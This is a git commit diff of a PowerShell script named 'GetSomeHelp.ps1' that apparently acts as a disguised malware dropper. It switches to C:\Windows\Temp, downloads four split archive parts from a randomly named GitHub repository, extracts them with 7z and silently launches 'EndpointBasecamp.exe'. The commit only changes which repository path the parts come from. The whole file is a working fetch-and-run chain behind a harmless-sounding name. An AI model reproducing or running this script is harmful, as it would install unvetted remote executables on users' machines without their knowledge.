07948e8a318fe807e067d8889e19b19993889a5e
jR467NysjywW7eGXUGpu <ture15tears@gmail.com>
2025-01-21 17:21:40 +0800

    Update GetSomeHelp.ps1

--- GetSomeHelp.ps1
+++ GetSomeHelp.ps1
@@ -1,7 +1,7 @@
 Set-Location C:\Windows\Temp;
-Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/KhswsZ3Bec/raw/refs/heads/main/EndpointBasecamp.zip.001" -OutFile "EndpointBasecamp.zip.001";
-Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/KhswsZ3Bec/raw/refs/heads/main/EndpointBasecamp.zip.002" -OutFile "EndpointBasecamp.zip.002";
-Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/KhswsZ3Bec/raw/refs/heads/main/EndpointBasecamp.zip.003" -OutFile "EndpointBasecamp.zip.003";
-Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/KhswsZ3Bec/raw/refs/heads/main/EndpointBasecamp.zip.004" -OutFile "EndpointBasecamp.zip.004";
+Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.001" -OutFile "EndpointBasecamp.zip.001";
+Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.002" -OutFile "EndpointBasecamp.zip.002";
+Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.003" -OutFile "EndpointBasecamp.zip.003";
+Invoke-WebRequest -Uri "https://github.com/jR467NysjywW7eGXUGpu/Khsw/raw/refs/heads/main/EndpointBasecamp.zip.004" -OutFile "EndpointBasecamp.zip.004";
 Start-Process -FilePath "7z.exe" -ArgumentList 'x "EndpointBasecamp.zip.001" -o"C:\Windows\Temp"' -NoNewWindow -Wait;
 Start-Process -FilePath "C:\Windows\Temp\EndpointBasecamp.exe" -NoNewWindow;
